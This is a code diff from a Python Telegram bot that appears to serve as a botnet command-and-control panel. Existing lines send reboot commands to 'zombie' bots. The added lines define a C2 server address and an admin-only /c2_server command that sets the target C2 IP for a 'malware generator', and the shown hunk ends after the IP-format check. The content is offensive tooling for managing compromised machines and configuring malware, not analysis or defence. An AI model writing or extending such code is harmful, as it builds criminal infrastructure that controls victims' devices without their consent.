@@ -3552,6 +3552,31 @@ async def reboot_zombies(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for sid in ACTIVE_BOTS:
         await C2_SERVER.send_command(sid, "SYSTEM_REBOOT")
     await update.message.reply_text("Reboot signal sent.")
+    
+# -------- Bot Integration --------
+
+C2_SERVER_IP = C2_SERVER_DEFAULT_IP
+C2_SERVER_PORT = C2_PORT_DEFAULT
+
+async def set_c2_server(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Command: /c2_server <IP>
+    Sets the target C2 IP address for the malware generator.
+    """
+    if update.effective_user.id not in ADMIN_IDS:
+        await update.message.reply_text("Access Denied. Admin Only.")
+        return
+        
+    if len(context.args) < 1:
+        await update.message.reply_text(f"Usage: /c2_server <IP_ADDRESS>\nCurrent IP: {C2_SERVER_IP}")
+        return
+        
+    ip_address = context.args[0]
+    
+    # Basic IP validation regex
+    if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip_address):
+        await update.message.reply_text("Invalid IP format.")
+        return
 
         
 # ---------------- GitHub Repository Manager (Phase 7) ----------------
